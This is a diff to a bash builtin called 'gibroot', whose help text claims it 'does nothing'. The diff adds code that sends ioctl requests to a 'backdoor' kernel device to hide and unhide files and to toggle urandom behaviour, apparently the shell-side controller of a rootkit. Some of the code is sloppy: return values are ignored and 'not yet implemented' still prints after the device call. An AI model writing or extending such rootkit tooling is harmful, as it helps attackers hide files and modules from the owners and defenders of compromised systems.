@@ -1,13 +1,12 @@
 $PRODUCES gibroot.c
 $BUILTIN gibroot
 $FUNCTION gibroot_builtin
-$SHORT_DOC gibroot
+$SHORT_DOC gibroot [cmd] [arg ...]
 does nothing
 :-)
 $END
 
 #include <config.h>
-
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -15,6 +14,10 @@ $END
 #include <fcntl.h>
 #include <sys/ioctl.h>
 #include <errno.h>
+#include <libgen.h>
+#include <dirent.h>
+#include <sys/types.h>
+#include <sys/stat.h>
 #include "../bashtypes.h"
 #include "../bashintl.h"
 #include "../shell.h"
@@ -31,6 +34,9 @@ $END
 #define REPLACE_CMD "replace"
 #define HIDE_MOD_CMD "hmod"
 #define SHOW_MOD_CMD "smod"
+
+
+#define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))
 
 static int backdoor_fd;
 
@@ -84,20 +90,182 @@ static int make_unroot(list) WORD_LIST *list;
 
 static int toggle_urandom(list) WORD_LIST *list;
 {
-	printf("not yet implemented\n");
+	int res;
+	int ret;
+	//printf("not yet implemented\n");
+	res = ioctl(backdoor_fd,URAND_IOCTL,NULL);
+	if (res == 0) {
+		printf("successfully toggled urandom behaviour\n");
+		ret = EXECUTION_SUCCESS;
+	} else {
+		perror("ERROR TOGGLING URANDOM BEHAVIOUR");
+		ret = EXECUTION_FAILURE;
+	}
 	return 0;
+}
+
+void init_request(struct hide_request *request)
+{
+        request->count = 0;
+        request->idents = NULL;
+}
+
+void add_request(struct hide_request *request,
+                int len,char *name,
+                dev_t dev, unsigned long par_ino)
+{
+	struct dentry_identifier new_ident = {
+                .name_len = len,
+                .device = dev,
+                .parent_ino = par_ino,
+        };
+	strncpy(new_ident.name,name,256);
+
+	request->count++;
+        request->idents = realloc(request->idents, //done since reallocarray doesn't seem to be available
+				request->count * sizeof(struct dentry_identifier));
+
+	memcpy(&request->idents[request->count - 1],&new_ident,sizeof(struct dentry_identifier));
+}
+
+void free_request(struct hide_request *request)
+{
+        free(request->idents);
+}
+
+static int get_parent_stuff(char *path,dev_t *parent_dev,
+		ino_t *parent_ino,DIR **parent_dir)
+{
+	int ret = 0;
+	char *dname;
+	struct stat parent_stat;
+	char *path_cpy = calloc((strlen(path) + 1),sizeof(char));
+	strcpy(path_cpy,path);//THIS ISN'T GREAT
+	dname = dirname(path_cpy);
+	if (stat(dname,&parent_stat)) {
+		perror("ERROR GETTING PARENT DIRECTORY");
+		ret = -1;
+		goto out;
+	}
+	*parent_dev = parent_stat.st_dev;
+	*parent_ino = parent_stat.st_ino;
+	//printf("parent ino:%lu\n",*parent_ino);
+	*parent_dir = opendir(dname);
+out:
+	free(path_cpy);
+	return ret;
+}
+
+static void get_basename_stuff(char *path,char **bname)
+{
+	char *path_cpy = calloc((strlen(path) + 1), sizeof(char));
+	char *base_ptr;
+	strcpy(path_cpy,path);//THIS ISN'T GREAT
+	base_ptr = basename(path_cpy);
+	*bname = calloc((strlen(base_ptr) + 1), sizeof(char));//MAKE SURE THAT THIS WILL BE AT MOST 256 BYTES
+	printf("base_ptr len:%d\n",strlen(base_ptr));
+	strncpy(*bname,base_ptr,MIN(strlen(base_ptr),255));
+	free(path_cpy);
+}
+
+static int construct_request(char *path, struct hide_request *req)
+{
+	DIR *parent_dir;
+	dev_t parent_dev;
+	ino_t parent_ino;
+	//struct dirent *cur;
+	char *bname;
+	int ret = 0;
+	ret = get_parent_stuff(path,
+			&parent_dev,
+			&parent_ino,
+			&parent_dir);
+	if (ret)
+		goto out;
+
+	get_basename_stuff(path,&bname);
+	add_request(req,
+		strlen(bname),
+		bname,
+		parent_dev,parent_ino);
+
+	printf("bname: %s\n",bname);
+	//printf("not yet implemented\n");
+	free(bname);
+out:
+	return ret;
 }
 
 static int hide_item(list) WORD_LIST *list;
 {
+	int res;
+	int ret;
+	struct hide_request req;
+	char *word;
+
+	init_request(&req);
+
+	while (list != NULL) {
+		word = list->word->word;
+		printf("current item: %s\n",word);
+		if(construct_request(word,&req))
+			goto err_out;
+		list = list->next;
+	}
+	printf("finished adding items\n");
+	printf("parent ino:%lu\n",req.idents[0].parent_ino);
+	res = ioctl(backdoor_fd,HIDE_IOCTL,&req);
+	free_request(&req);
+
+	if (res == 0) {
+		printf("successfully hid items\n");
+		ret = EXECUTION_SUCCESS;
+	} else {
+		perror("ERROR HIDING ITEMS");
+		ret = EXECUTION_FAILURE;
+	}
 	printf("not yet implemented\n");
 	return 0;
+err_out:
+	if (req.count)
+		free_request(&req);
+	return EXECUTION_FAILURE;
 }
 
 static int show_item(list) WORD_LIST *list;
 {
+	int res;
+	int ret;
+	struct hide_request req;
+	char *word;
+
+	init_request(&req);
+
+	while (list != NULL) {
+		word = list->word->word;
+		printf("current item: %s\n",word);
+		if(construct_request(word,&req))
+			goto err_out;
+		list = list->next;
+	}
+	printf("finished adding items\n");
+	printf("parent ino:%lu\n",req.idents[0].parent_ino);
+	res = ioctl(backdoor_fd,SHOW_IOCTL,&req);
+	free_request(&req);
+
+	if (res == 0) {
+		printf("successfully unhid items\n");
+		ret = EXECUTION_SUCCESS;
+	} else {
+		perror("ERROR UNHIDING ITEMS");
+		ret = EXECUTION_FAILURE;
+	}
 	printf("not yet implemented\n");
 	return 0;
+err_out:
+	if (req.count)
+		free_request(&req);
+	return EXECUTION_FAILURE;
 }
 
 static int list_hidden_items(list) WORD_LIST *list;
@@ -180,6 +348,8 @@ static int get_first_arg(list) WORD_LIST *list;
 int gibroot_builtin(list) WORD_LIST *list;
 {
 	int ret = 0;
+	printf("sizeof ino_t:%ld\n",sizeof(ino_t));
+	printf("sizeof dev_t:%ld\n",sizeof(dev_t));
 	if (open_device() == -1) {
 		printf("ERROR: backend device not registered\n");
 		ret = EXECUTION_FAILURE;
